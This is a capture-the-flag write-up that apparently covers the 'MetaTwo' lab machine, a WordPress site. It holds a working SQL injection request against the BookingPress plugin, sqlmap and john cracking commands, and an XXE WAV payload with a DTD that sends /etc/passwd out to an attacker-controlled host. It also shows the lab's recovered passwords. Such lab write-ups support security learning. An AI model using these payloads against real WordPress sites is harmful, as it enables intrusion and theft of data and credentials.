# MetaTwo

## Enumeration

Start off with an nmap scan which looks like this : `nmap -Pn -sV -sC -v <IP>`

```vim
Nmap scan report for 10.129.67.13
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see here that FTP, SSH and HTTP ports are open. FTP port will require a username and password but since we don't have any, we have to look into the web application first.

Add `http://metapress.htb` to `/etc/hosts` file and we can start looking into the website.

First glance at the website shows us that the web application is based on WordPress. Running a GoBuster will reveal a lot of directories and files but the most important one is `wp-login.php`. However, we can't login into it with any bruteforcing or SQLi so we have to look into the website to see any other way.

Looking through the `/events` page, we note the following:
1. You are booking the timing and date for a particular event
2. You are making POST requests to `/wp-admin/admin-ajax.php`
3. There is something calling `bookingpress` that is involved in every action with the events
4. Looking into the page source, we see that `bookingpress` is a plugin that is used for booking things (almost like its in the name)
5. `WordPress` version is 5.6.2 and `bookingpress` version is 1.0.10

## Exploit

### Exploiting SQLi CVE

I start looking into vulnerabilities for WordPress first but I don't see anything that I can exploit. I then start looking into vulnerabilities for `bookingpress` instead. Looking into this, I come across the following CVE: `CVE-2022-0739`. This CVE allows for unauthenticated SQLi, which seems of interest even if unauthenticated.

I look for any repositories which have a POC that I can use to exploit and I come across the following repository: https://github.com/destr4ct/CVE-2022-0739

After reading through the exploit mentioned in the above repository, I come up with the following payload which we can use:

Tip: Look into any previous POST requests and keep note of your `_wpnonce` value and replace yours with mine in the below request. This is important to have in the exploit

```HTTP
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Origin: http://metapress.htb
DNT: 1
Connection: close
Referer: http://metapress.htb/events/
Cookie: wordpress_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1667470314%7CtYAMZn76jwa37M5fEuOS6zcYv7RaL9bs4XQ9ZqegHse%7C62f0cf57beb8da34ad948c85d8bf184fd465f6be48445c2f03220c62efeff476; PHPSESSID=gndc2a5nhvl2e69q9a52fbb09i; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_498b28797b9ccef61e19f54e27d9e6f4=manager%7C1667470314%7CtYAMZn76jwa37M5fEuOS6zcYv7RaL9bs4XQ9ZqegHse%7Cc6fc90673bc9e570cab02ca39b32b3564a0d6365dfb57855c45e386a8955f41e; wp-settings-time-2=1667297514; wp-settings-2=mfold%3Do

action=bookingpress_front_get_category_services&_wpnonce=f7f1305701&category_id=1&total_service=2) UNION ALL SELECT @@VERSION,@@version_comment,@@version_compile_os,2,3,4,5,6,7 -- -
```

The reason I have so many cookies is probably because of me actually listing an event. You can do this with only the PHPSESSID as far as I am aware but since I have all these cookies set, I can't do a request without them.

I get a response back which looks like this:

```json
[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$2.00","bookingpress_service_duration_val":"3","bookingpress_service_duration_unit":"4","bookingpress_service_description":"5","bookingpress_service_position":"6","bookingpress_servicedate_created":"7","service_price_without_currency":2,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

Here, we can see that SQLi is possible and we have one of 2 roads to pick from here:
1. Manually doing SQLi
2. SQLmap dump and then sort through the tables

I picked the latter and copied the above HTTP request into a file called `temp.req` (Change out your SQLi payload for something like `1` so that SQLmap can function) and ran the following command:

```vim
sqlmap -r temp.req -p total_service --batch --dump
```
Your tables will probably be in `~/.local/share/sqlmap/output/metapress.htb/dump/blog`. Out of all these, wp_users.csv seems to be the most interesting.

This gives us 2 usernames and 2 password hashes. We can crack this by putting the hashes in a file (I called mine `hash`), and running the following command

```vim
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

The password for the manager account is `partylikearockstar` and the admin one is uncrackable probably. I tried logging in with these credentials on FTP but it seems like that doesn't work.

### Exploting Upload XXE CVE 

We try to log into `wp-login.php` with these credentials and that works. I tried looking around the admin portal but I didn't see anything that seemed of interest other than the media file uploads. I look if there is any vulnerability online regarding that and I come across the following CVE: CVE-2021-29447

I found the POC of it here: https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5

I made the following files with the following content:

1. payload.wav

Run the following for payload.wav (after changing in your IP and port from python server):

```vim
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.7:8000/xxe.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

2. xxe.dtd

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.7:8000/?p=%file;'>" >
```

And then started a http server with the following command: `python -m http.server 8000` and Upload the payload.wav file in `wp-admin/upload.php` (This is the media tab in the admin portal).

Check on your python server and you will see the base64 encoded file content for `/etc/passwd`. This reveals the `jnelson` user to us, however we don't have access to any ssh keys so we have to find some other pathway to exploit. 

Since we have LFI, we can try to read `wp-config.php` which usually contains sensitive information for the web application. I found the file in `../wp-config.php` (There is another way to find this which involves looking into the nginx server config, but I found this while reading through some other POCs). 

In `wp-config.php` we find the FTP credentials being `metapress.htb:9NYS_ii@FyL_p5M2NvJ`

After logging into FTP, we can see a blog file and a mailer file. I start looking at the mailer file first and find `send_email.php`, where we find the credentials for jnelson.

Start an ssh session with `ssh jnelson@metapress.htb` and enter the password. The user flag can be found in `user.txt`.

## Priv-Esc

Looking at the home directory, we see a `.passpie`. Passpie is a commandline password manager, which seems promising for a Priv-Esc. Looking into `.passpie` we come across `.keys` which holds a PGP private and public key. I immediately try to crack it while looking into any documentation of passpie to view whose passwords are on and if we can extract the passwords in cleartext.

To crack the PGP private key, first copy it to a file in your machine(I used privkey.pgp). Then run the following command:

```vim
gpg2john privkey.pgp > hash && john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

The password is `blink182`.

With passpie, you can see which passwords are on by simply running `passpie list`. I found out from the passpie documentation that you can export passwords with the command `passpie export <FILE>` and then reading the file. You have to use the password cracked above to be able to run the command.

We find out that the password for root is `p7qfAZt4_A1xo_0x`. We can login with `su` and entering the password. The root flag can be found in `/root/root.txt`
